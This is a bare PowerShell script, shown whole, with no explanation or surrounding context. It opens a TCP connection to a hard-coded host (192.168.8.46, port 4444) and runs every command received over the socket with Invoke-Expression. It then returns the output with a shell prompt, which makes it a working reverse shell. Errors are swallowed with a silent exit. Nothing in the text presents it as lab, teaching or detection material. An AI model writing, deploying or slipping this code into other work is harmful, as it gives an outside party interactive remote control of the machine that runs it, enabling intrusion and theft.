$ip = "192.168.8.46"
$port = 4444
try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (iex $data 2>&1 | Out-String )
        $prompt = $sendback + "PS " + (pwd).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($prompt)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
} catch {
    exit
}
